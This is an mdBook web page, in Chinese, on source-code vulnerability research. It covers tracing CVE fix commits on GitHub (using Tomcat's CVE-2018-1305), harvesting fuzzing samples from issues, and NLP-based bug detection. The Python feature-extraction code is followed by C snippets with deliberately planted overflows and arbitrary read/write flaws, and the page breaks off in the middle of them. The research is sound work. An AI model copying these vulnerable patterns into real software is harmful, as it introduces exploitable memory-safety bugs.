<!DOCTYPE HTML>
<html lang="en" class="sidebar-visible no-js light">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Source and Fuzzing</title>
        <meta name="robots" content="noindex" />


        <!-- Custom HTML head -->
        
        <meta name="description" content="The example book covers examples.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="highlight.css">
        <link rel="stylesheet" href="tomorrow-night.css">
        <link rel="stylesheet" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="./theme/custom.css">
        <link rel="stylesheet" href="theme/pagetoc.css">
        <link rel="stylesheet" href="./theme/catppuccin.css">
        <link rel="stylesheet" href="./theme/catppuccin-highlight.css">

    </head>
    <body>
    <div id="body-container">
        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item expanded "><a href="1.Github.html"><strong aria-hidden="true">1.</strong> Github</a></li><li class="chapter-item expanded "><a href="11.AI.html"><strong aria-hidden="true">2.</strong> Ai</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan.html"><strong aria-hidden="true">3.</strong> Libfuzzer Asan</a></li><li class="chapter-item expanded "><a href="2.Fuzzing.html"><strong aria-hidden="true">4.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="3.Fuzzing.html"><strong aria-hidden="true">5.</strong> Fuzzing</a></li><li class="chapter-item expanded "><a href="4.source-code.html"><strong aria-hidden="true">6.</strong> Source Code</a></li><li class="chapter-item expanded "><a href="5.compile.html"><strong aria-hidden="true">7.</strong> Compile</a></li><li class="chapter-item expanded "><a href="6.static-analysis.html"><strong aria-hidden="true">8.</strong> Static Analysis</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis.html"><strong aria-hidden="true">9.</strong> Dynamic Analysis</a></li><li class="chapter-item expanded "><a href="8.llvm.html"><strong aria-hidden="true">10.</strong> Llvm</a></li><li class="chapter-item expanded "><a href="9.klee.html"><strong aria-hidden="true">11.</strong> Klee</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">12.</strong> Chapter 1</a></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">13.</strong> Libfuzzer Asan</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan.html"><strong aria-hidden="true">13.1.</strong> 深入解析libfuzzer与asan</a></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">13.2.</strong> 深入解析libfuzzer与asan</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/ASAN原理.html"><strong aria-hidden="true">13.2.1.</strong> Asan原理</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/LLVM下的插桩简述.html"><strong aria-hidden="true">13.2.2.</strong> Llvm下的插桩简述</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/libFuzzer原理.html"><strong aria-hidden="true">13.2.3.</strong> libFuzzer原理</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/参考引用.html"><strong aria-hidden="true">13.2.4.</strong> 参考引用</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/实战中ASAN会有哪些坑.html"><strong aria-hidden="true">13.2.5.</strong> 实战中asan会有哪些坑</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/深入解析libFuzzer参数与回显.html"><strong aria-hidden="true">13.2.6.</strong> 深入解析libFuzzer参数与回显</a></li><li class="chapter-item expanded "><a href="12.libfuzzer-asan/深入解析libfuzzer与asan/玩转Sanitizer-Coverage.html"><strong aria-hidden="true">13.2.7.</strong> 玩转Sanitizer Coverage</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">14.</strong> Static Analysis</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理.html"><strong aria-hidden="true">14.1.</strong> 静态程序分析原理</a></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">14.2.</strong> 静态程序分析原理</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理/必备工具.html"><strong aria-hidden="true">14.2.1.</strong> 必备工具</a></li><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理/附录一--各图的Graphiz生成代码.html"><strong aria-hidden="true">14.2.2.</strong> 附录一  各图的Graphiz生成代码</a></li><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理/附录二--静态审计工具完整源码.html"><strong aria-hidden="true">14.2.3.</strong> 附录二  静态审计工具完整源码</a></li><li class="chapter-item expanded "><a href="6.static-analysis/静态程序分析原理/静态代码分析基本原理.html"><strong aria-hidden="true">14.2.4.</strong> 静态代码分析基本原理</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">15.</strong> Dynamic Analysis</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理.html"><strong aria-hidden="true">15.1.</strong> 动态程序分析原理</a></li><li class="chapter-item expanded "><a href="#.html"><strong aria-hidden="true">15.2.</strong> 动态程序分析原理</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/内存监控.html"><strong aria-hidden="true">15.2.1.</strong> 内存监控</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/动态代码分析基本原理.html"><strong aria-hidden="true">15.2.2.</strong> 动态代码分析基本原理</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/必备工具.html"><strong aria-hidden="true">15.2.3.</strong> 必备工具</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/污点追踪.html"><strong aria-hidden="true">15.2.4.</strong> 污点追踪</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/程序插桩与代码覆盖率.html"><strong aria-hidden="true">15.2.5.</strong> 程序插桩与代码覆盖率</a></li><li class="chapter-item expanded "><a href="7.dynamic-analysis/动态程序分析原理/符号执行.html"><strong aria-hidden="true">15.2.6.</strong> 符号执行</a></li></ol></li></ol></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Source and Fuzzing</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main><div class="sidetoc"><nav class="pagetoc"></nav></div>
                        <h1 id="1-github"><a class="header" href="#1-github">1. Github</a></h1>
<ul>
<li><a href="1.Github.html#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
<li><a href="1.Github.html#%E4%BB%8Egithub-%E5%BC%80%E5%A7%8B">从Github 开始</a></li>
<li><a href="1.Github.html#github-commits">Github commits</a></li>
<li><a href="1.Github.html#github-search">Github Search</a></li>
<li><a href="1.Github.html#github-issus">Github Issus</a></li>
<li><a href="1.Github.html#%E5%9C%A8github-%E4%B8%8A%E8%AF%BB%E4%BB%A3%E7%A0%81">在Github 上读代码</a>
<ul>
<li><a href="1.Github.html#%E6%A0%B9%E6%8D%AE%E6%96%87%E4%BB%B6%E5%A4%B9%E6%9D%A5%E9%98%85%E8%AF%BB">根据文件夹来阅读</a></li>
<li><a href="1.Github.html#%E6%A0%B9%E6%8D%AE%E6%95%8F%E6%84%9F%E5%87%BD%E6%95%B0%E6%9D%A5%E9%98%85%E8%AF%BB">根据敏感函数来阅读</a></li>
</ul>
</li>
<li><a href="1.Github.html#git-clone">Git Clone</a></li>
<li><a href="1.Github.html#example">Example</a></li>
</ul>
<h2 id="必备工具"><a class="header" href="#必备工具">必备工具</a></h2>
<p>Git ,Github</p>
<h2 id="从github-开始"><a class="header" href="#从github-开始">从Github 开始</a></h2>
<p>Github 是代码分享平台,使用Github 能够找到很多开源项目,关于Github 不多做介绍了,下面分享些使用Github 读代码的操作</p>
<h2 id="github-commits"><a class="header" href="#github-commits">Github commits</a></h2>
<p>Github commits 的功能是用来记录每一次Git 提交代码的信息,里面包含了修改代码的原因,还有修改了哪些代码.Github commits 的功能在这里</p>
<p><img src="pic1/github_commit.png" alt="" /></p>
<p>点击之后,可以看到很多Git 提交代码的记录</p>
<p><img src="pic1/github_commit_info.png" alt="" /></p>
<p>随意点开一条记录,可以看到很多关于这条Commit 的信息</p>
<p><img src="pic1/github_commit_record.png" alt="" /></p>
<p>使用Github commits 有一个操作就是:<strong>一般来说,部分安全告警或者存在特别严重漏洞的开源项目向外发出通知的时候,往往只是提醒漏洞是影响了哪些版本,什么时候修复,要更新到最新的版本.关于漏洞的详情是很少提及的,甚至PoC 也没有.那么这个时候要怎么去研究漏洞呢?答案是追踪Commit 提交记录</strong></p>
<p>以CVE-2018-1305 为例子,关于绿盟的对外的通告如下(其他通告都大同小异):</p>
<p><img src="pic1/nsfocus_record.png" alt="" /></p>
<p>里面只有一个邮件通信记录,我们进去看看有什么(https://lists.apache.org/thread.html/d3354bb0a4eda4acc0a66f3eb24a213fdb75d12c7d16060b23e65781@%3Cannounce.tomcat.apache.org%3E)</p>
<p><img src="pic1/CVE-2018-1305_email.png" alt="" /></p>
<p>邮件最低下面有个References ,翻译为中文是引用的意思,在这里多插一句话:文章里面的引用一般是拓展阅读或者理论/数据的来源依据,如果读者需要进一步去深入这个文章,引用来源就是最好的入手点**.我们挑其中一个引用的URL 来看看(http://tomcat.apache.org/security-9.html),下面是我挑出的重点信息</p>
<p><img src="pic1/CVE-2018-1305_info.png" alt="" /></p>
<p>圆圈里的意思是漏洞的描述,方框里标明的是其他有用的信息:影响的版本(Affects: 9.0.0.M1 to 9.0.4),最新修复的版本号(Fixed in Apache Tomcat 9.0.5),公开漏洞的时间(11 February 2018),Commit ID (This was fixed in revisions 1823310 and 1824323.).</p>
<p>找到Commit ID ,点进去看看,这个时候就跳转到了Apache 的SVN Commit 记录里边了(http://svn.apache.org/viewvc?view=revision&amp;revision=1823310).[PS:SVN 和Git 都是版本管理工具]</p>
<p><img src="pic1/CVE-2018-1305_svn_commit.png" alt="" /></p>
<p>我们可以看到这次修复漏洞修改了哪些代码.但是点进去代码里看,也没有diff ,所以现在回到Git commits 里继续找修复代码的Commit .那么要怎么去找Commit 呢?这个时候,漏洞修复时间就派上用场了.</p>
<p>SVN 的Commit 里面有一个Commit 时间(如果没有找到对应的Commit ,就在漏洞报告时间(2018/2/1)到漏洞公开时间(2018/2/23)搜索Commit )</p>
<p><img src="pic1/CVE-2018-1305_fix_time.png" alt="" /></p>
<p>然后去找Commit ,发现没有找到</p>
<p><img src="pic1/CVE-2018-1305_master_commit.png" alt="" /></p>
<p>这就很迷了,为啥会找不到呢.读者们回到主页,点击这里</p>
<p><img src="pic1/github_version.png" alt="" /></p>
<p>这个时候,漏洞影响版本号就派上用场了,嘿嘿嘿</p>
<p><img src="pic1/github_version_select.png" alt="" /></p>
<p>...这里找了个遍都没有找到这个版本,太神奇了,咱们再细细看看漏洞信息哈</p>
<p><img src="pic1/tips_tomcat.png" alt="" /></p>
<p>??? 难道tomcat 和apache 是不同的?那我去搜索一下tomcat [PS:Github 搜索有很多很有趣的使用套路,待会和大家分享一个学习漏洞原理的骚操作]</p>
<p><img src="pic1/github_search.png" alt="" /></p>
<p><img src="pic1/github_tomcat.png" alt="" /></p>
<p>看来找错了开源项目,那就先看看版本分支吧</p>
<p><img src="pic1/tomcat_trunk.png" alt="" /></p>
<p>有些开源项目是有设置不同的版本分支管理的,没有也没关系,那就来找Commit 吧</p>
<p><img src="pic1/CVE-2018-1305_git_commit.png" alt="" /></p>
<p>现在已经定位到了2018/2/6 号的Commit 信息,这里有几个Commit ,一个一个慢慢看吧,搜素的过程就不多说了,最后定位到这两个Commit</p>
<p><img src="pic1/CVE-2018-1305_git_commit_1.png" alt="" /></p>
<p>修复代码:https://github.com/apache/tomcat/commit/3e54b2a6314eda11617ff7a7b899c251e222b1a1
测试用例:https://github.com/apache/tomcat/commit/af0c19ffdbe525ad690da4fd7e988c7788d00141</p>
<p>在Git 的Commit 里还能看到Diff ,很容易就知道到底哪些代码被修改过(包括代码注释)</p>
<p><img src="pic1/CVE-2018-1305_git_diff.png" alt="" /></p>
<p>在测试用例里面就可以直接找到PoC 了</p>
<p><img src="pic1/CVE-2018-1305_test_case.png" alt="" /></p>
<h2 id="github-search"><a class="header" href="#github-search">Github Search</a></h2>
<p>前面已经说到了如何使用Commit 了,相信读者也已经去秀了一波操作,找到更多关于漏洞修复的细节,上一节有提到,关于Github Search 有一个学习代码的骚操作,当年我就是用这一招弄明白了JavaScript 这种脚本解析引擎的漏洞应该要怎么挖,是不是很想知道到底是啥套路.</p>
<p>在搜索框里输入<code>CVE</code> ,记住,要想挖哪个开源项目就去那个开源项目的Github 上搜素CVE 三个字</p>
<p><img src="pic1/github_search_cve.png" alt="" /></p>
<p><img src="pic1/github_search_cve_result.png" alt="" /></p>
<p>结果如上,这个是Code 搜素,搜素出来的结果比较少,咱们切换到Commits 来看看</p>
<p><img src="pic1/github_search_cve_commit_result.png" alt="" /></p>
<p>是不是发现了新世界 :)</p>
<p><img src="pic1/github_search_1.png" alt="" /></p>
<p><img src="pic1/github_search_2.png" alt="" /></p>
<p><img src="pic1/github_search_3.png" alt="" /></p>
<p>洞海无涯苦作舟,用这种方法可以从issus 和Commit 里面学到很多,但是要看懂整个Commit 不只是要看Diff ,还要下载代码到本地一步一步分析漏洞成因</p>
<h2 id="github-issus"><a class="header" href="#github-issus">Github Issus</a></h2>
<p>Issus 可以看到很多漏洞挖掘的操作,特别是AFL 和libFuzzer 的怎么样使用的,同时在这些提交漏洞的Issus 里还能收集到很多样本,可以直接拿下来到其他的开源项目里继续使用,举个例子,ImageMagick 的Issus :https://github.com/ImageMagick/ImageMagick/issues</p>
<p><img src="pic1/github_issus.png" alt="" /></p>
<p><img src="pic1/github_issus_info.png" alt="" /></p>
<p>这里告诉大家样本在哪儿可以下载,重点是触发的命令是什么,有了这个触发命令之后,我们也可以去照猫画虎拿到AFL 里去跑Fuzzing 啦,美滋滋</p>
<h2 id="在github-上读代码"><a class="header" href="#在github-上读代码">在Github 上读代码</a></h2>
<p>一般我都是先在Github 上阅读代码,然后再下载代码到本地Source Insight 继续读.我们有两种方式在Github 上开始阅读</p>
<h3 id="根据文件夹来阅读"><a class="header" href="#根据文件夹来阅读">根据文件夹来阅读</a></h3>
<p>简单地来说:<strong>关注文件/文件夹的名字</strong></p>
<p><img src="pic1/dir_php.png" alt="" /></p>
<p><img src="pic1/dir_antminer.png" alt="" /></p>
<p><img src="pic1/file_redis.png" alt="" /></p>
<p>多翻一下目录和文件,总会遇到你感兴趣的一个地方来读</p>
<h3 id="根据敏感函数来阅读"><a class="header" href="#根据敏感函数来阅读">根据敏感函数来阅读</a></h3>
<p>善用Github 的搜索功能,它能够帮你搜索代码或者其他信息</p>
<p><img src="pic1/github_search_function.png" alt="" /></p>
<p><img src="pic1/github_search_function1.png" alt="" /></p>
<p>找到了一个感兴趣的地方开始阅读代码之后,Github 的搜素功能可以帮助你向上回溯代码</p>
<p><img src="pic1/save_command.png" alt="" /></p>
<p><img src="pic1/save_command_find.png" alt="" /></p>
<p><img src="pic1/save_command_find_in_browser.png" alt="" /></p>
<p>在网页和普通编辑器阅读源码记得要多使用<code>Ctrl + F</code> ,它能够帮你快速定位当前代码文件的函数定位</p>
<p><img src="pic1/ctrl_f_find.png" alt="" /></p>
<h2 id="git-clone"><a class="header" href="#git-clone">Git Clone</a></h2>
<p>这个就不多介绍了,下载代码到本地</p>
<h2 id="example"><a class="header" href="#example">Example</a></h2>
<p>去年挖到一个蚂蚁矿机的远程代码执行漏洞,发现这个问题是直接在Github 上读代码的找到的,附上源码分析.</p>
<p><img src="pic1/source.png" alt="" /></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="2-ai-算法挖洞的一些尝试"><a class="header" href="#2-ai-算法挖洞的一些尝试">2. AI 算法挖洞的一些尝试</a></h1>
<ul>
<li><a href="11.AI.html#%E6%BC%8F%E6%B4%9E%E7%89%B9%E5%BE%81%E7%A0%81%E7%AD%9B%E9%80%89">漏洞特征码筛选</a>
<ul>
<li><a href="11.AI.html#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E7%89%B9%E5%BE%81%E5%AF%B9%E6%AF%94">漏洞代码特征对比</a></li>
<li><a href="11.AI.html#basicblock-%E5%89%AA%E6%9E%9D">BasicBlock 剪枝</a></li>
<li><a href="11.AI.html#ast-%E7%89%B9%E5%BE%81%E5%BA%8F%E5%88%97%E5%8C%96">AST 特征序列化</a></li>
<li><a href="11.AI.html#doc2vec-%E7%AE%97%E6%B3%95%E4%B8%8E%E7%89%B9%E5%BE%81%E5%AF%B9%E6%AF%94">Doc2Vec 算法与特征对比</a></li>
</ul>
</li>
<li><a href="11.AI.html#%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E9%98%B6%E6%AE%B5">漏洞验证阶段</a>
<ul>
<li><a href="11.AI.html#example-1----%E5%8D%95%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E6%95%B0%E5%80%BC%E5%88%A4%E6%96%AD">Example 1 -- 单变量与常数值判断</a></li>
<li><a href="11.AI.html#example-2----%E5%8D%95%E5%8F%98%E9%87%8F%E4%B8%8E%E5%8D%95%E5%8F%98%E9%87%8F%E5%88%A4%E6%96%AD">Example 2 -- 单变量与单变量判断</a></li>
<li><a href="11.AI.html#example-3----%E5%8D%95%E5%8F%98%E9%87%8F%E4%B8%8E%E5%B8%B8%E6%95%B0%E5%80%BC%E5%A4%9A%E6%AC%A1%E5%88%A4%E6%96%AD">Example 3 -- 单变量与常数值多次判断</a></li>
<li><a href="11.AI.html#example-4----%E5%A4%9A%E5%8F%98%E9%87%8F%E5%BC%95%E7%94%A8%E4%B8%8E%E5%8D%95%E6%AC%A1%E5%88%A4%E6%96%AD">Example 4 -- 多变量引用与单次判断</a></li>
<li><a href="11.AI.html#example-5----%E6%95%B0%E7%BB%84%E5%BC%95%E7%94%A8">Example 5 -- 数组引用</a></li>
<li><a href="11.AI.html#example-6----%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90">Example 6 -- 任意地址读写漏洞分析</a></li>
<li><a href="11.AI.html#%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4%E4%B8%8E%E5%87%BD%E6%95%B0%E7%9B%B8%E4%BA%A4">取值范围与函数相交</a></li>
<li><a href="11.AI.html#%E6%BC%8F%E6%B4%9E%E6%A0%B7%E6%9C%AC%E6%A3%80%E9%AA%8C">漏洞样本检验</a></li>
<li><a href="11.AI.html#%E6%80%BB%E7%BB%93">总结</a></li>
</ul>
</li>
</ul>
<h2 id="漏洞特征码筛选"><a class="header" href="#漏洞特征码筛选">漏洞特征码筛选</a></h2>
<h4 id="漏洞代码特征对比"><a class="header" href="#漏洞代码特征对比">漏洞代码特征对比</a></h4>
<p>NLP 算法普遍运用在恶意代码识别分类,最核心的一点还是通过黑白代码样本进行分类(参考https://xz.aliyun.com/t/5666 ,https://xz.aliyun.com/t/5848 ).NLP 算法对数据分类来说是很友好的,因为它能够通过给定的分类样本和特征来对数据进行识别,但是要使用这些算法应用到漏洞挖掘,除了分类识别还需要一步就是要对漏洞进行校验(符号执行在从入口点开始递归路径时,因为条件分支和求解速度的问题往往会导致性能非常慢,那么能不能通过事先筛选一些可以的特征然后来探索可执行的路径再检验漏洞呢?).接下来分别探讨这两个步骤的一些细节.</p>
<h4 id="basicblock-剪枝"><a class="header" href="#basicblock-剪枝">BasicBlock 剪枝</a></h4>
<p>我们用第五章里的一个示例来研究,因为Condition 条件判断的引入,代码结构其实是二维的.</p>
<p><img src="pic11/pic20.png" alt="" /></p>
<p>如果需要使用NLP 的方式来对代码进行识别,那么就需要把二维的代码结构转化为一维,这样代码序列看起来才会和文章的内容一样(转化成为一段英文语句),所以就需要对函数内的BasicBlock 进行剪枝,修剪之后的结构如下.</p>
<p><img src="pic11/pic21.png" alt="" /></p>
<p>代码实现不难,主要是通过if /switch 等语句进行处理,for /while 语句可以忽略不处理.</p>
<pre><code class="language-python">def basic_block_preprocess(code_ast_subnode) :  # BasicBlock 剪枝
    flatten_basic_block_list = []
    root_basic_block = []

    for root_ast_node_index in code_ast_subnode :
        ast_node_type = get_type(root_ast_node_index)  #  获取AST 节点类型

        if 'CIfStatement' == ast_node_type :  #  目前只筛选if 语句
            if_ast_node = root_ast_node_index.body  #  获取if AST 的内容
            if_ast_node_type = get_type(if_ast_node)

            if 'CBody' == if_ast_node_type :  #  对应的是if (???) {xxx} 的写法
                sub_basic_block_list = basic_block_preprocess(if_ast_node.contentlist)  #  递归遍历if 语句

                for sub_basic_block_index in sub_basic_block_list :
                    flatten_basic_block_list.append( root_basic_block + sub_basic_block_index)  #  合并剪枝之后的代码序列
            else :  #  对应的是if (???) xxx; 的写法
                if_basic_block_ast_node = root_ast_node_index.body  #  if 里面语句代码块的内容
                if_basic_block_ast_node_type = get_type(if_basic_block_ast_node)  #  获取这个语句的类型

                flatten_basic_block_list.append(root_basic_block + [ (if_basic_block_ast_node_type,if_basic_block_ast_node) ])  #  合并代码序列

            if root_ast_node_index.elsePart :  #  如果这个if 语句还存在else if 或else ..
                if_else_ast_node_type = get_type(root_ast_node_index.elsePart.body)

                if 'CBody' == if_else_ast_node_type :
                    if_else_ast_node = root_ast_node_index.elsePart.body
                else :
                    if_else_ast_node = root_ast_node_index.elsePart.body.body

                sub_basic_block_list = basic_block_preprocess(if_else_ast_node.contentlist)  #  继续递归它的body 代码

                for sub_basic_block_index in sub_basic_block_list :
                    flatten_basic_block_list.append( root_basic_block + sub_basic_block_index)  #  合并剪枝之后的代码序列

            continue

        root_basic_block.append((ast_node_type,root_ast_node_index))  #  这是当前层的代码序列

    flatten_basic_block_list.append(root_basic_block)

    return flatten_basic_block_list
</code></pre>
<h4 id="ast-特征序列化"><a class="header" href="#ast-特征序列化">AST 特征序列化</a></h4>
<p>AST 结构树并不合适直接使用NLP 算法来对它进行识别,我们需要对它进行预处理,变成合适由NLP 算法处理的格式.</p>
<pre><code class="language-python">def reduce_ast_node_list(code_ast_list) :  #  AST 预处理
    def get_var_type(var_type) :  #  获取变量类型
        var_type_string = ''

        for var_type_index in var_type :
            if 'unsigned' == var_type_index :  #  unsigned int ,unsigned char .drop the keyword unsigned
                continue

            var_type_string += var_type_index + '.'

        if var_type_string :
            var_type_string = var_type_string[ : -1 ]

        return var_type_string

    result_list = []

    for code_ast_index in code_ast_list :
        code_ast_node_type = code_ast_index[0]  #  AST 节点类型
        code_ast_node_data = code_ast_index[1]  #  AST 节点数据

        if 'CVarDecl' == code_ast_node_type :  #  变量声明
            is_type = get_type(code_ast_node_data.type)  #  变量类型

            if 'CArrayType' == is_type :  #  数组
                var_type = get_var_type(code_ast_node_data.type.arrayOf.builtinType)

                result_list.append('variable_define_array:%s' % (var_type))
            elif 'CBuiltinType' == is_type :  #  普通变量
                var_type = get_var_type(code_ast_node_data.type.builtinType)

                result_list.append('variable_define:%s' % (var_type))
            elif 'CPointerType' == is_type :  #  指针变量
                var_type = get_var_type(code_ast_node_data.type.pointerOf.builtinType)

                result_list.append('variable_define_point:%s' % (var_type))

        elif 'CStatement' == code_ast_node_type :  #  赋值
            assigment_data = code_ast_node_data._leftexpr
            sub_ast_node_type = get_type(assigment_data)

            if 'CFuncCall' == sub_ast_node_type :  #  函数调用
                function_name = assigment_data.base.name

                result_list.append('function_call:%s' % (function_name))
            elif 'CArrayIndexRef' == sub_ast_node_type :  #  数组引用
                access_type = assigment_data.base.type

                if 'CArrayType' == access_type :      #  buffer[10] = ???;
                    result_list.append('assigment_array_index')
                elif 'CPointerType' == access_type :  # *buffer[10] = ???;
                    result_list.append('assigment_point_index')
            elif 'CStatement' == sub_ast_node_type :  #  变量数据值
                assigment_data = assigment_data._rightexpr._leftexpr
                assigment_type = assigment_data.type

                if 'CArrayType' == assigment_type :      #  buffer[10] = ???;
                    result_list.append('assigment_array_index')
                elif 'CPointerType' == assigment_type :  # *buffer[10] = ???;
                    result_list.append('assigment_point_index')
                #.pointerOf.builtinType

        else :
            result_list.append(code_ast_node_type)

    return result_list
</code></pre>
<h4 id="doc2vec-算法与特征对比"><a class="header" href="#doc2vec-算法与特征对比">Doc2Vec 算法与特征对比</a></h4>
<p>Doc2Vec 算法用来对一段文本进行识别,判断这段文本属于哪一类型.我们假设了一系列的黑白样本:</p>
<pre><code class="language-python">code_sample_memcpy_check_1 = '''
void main() {
    char* buffer = (char*)malloc(20);
    char* command_buffer = (char*)malloc(10);

    memcpy(&amp;command_buffer,&amp;buffer,20);
}
'''
code_sample_memcpy_check_2 = '''
void main() {
    char buffer[20] = {0};
    char command_buffer[10] = {0};

    memcpy(&amp;command_buffer,&amp;buffer,20);
}
'''
code_sample_buffer_check_1 = '''
void main() {
    char buffer[10] = {0};

    buffer[10] = '\0';
}
'''
code_sample_buffer_check_2 = '''
void main() {
    char* buffer = (char*)malloc(10);

    buffer[20] = '\0';
}
'''
code_sample_arbitrarily_write_check_1 = '''
void main(char* point) {
    char* buffer = point;

    *buffer = 0x1;
}
'''
code_sample_arbitrarily_write_check_2 = '''
void main(char* offset) {
    char buffer[10] = {0};

    *(buffer + offset) = 0x1;
}
'''
code_sample_arbitrarily_read_check_1 = '''
void main(char* point) {
    char* buffer = point;
    char  data = *buffer;
}
'''
code_sample_arbitrarily_read_check_2 = '''
void main(char* offset) {
    char buffer[10] = {0};
    char  data = *(buffer + offset);
}
'''

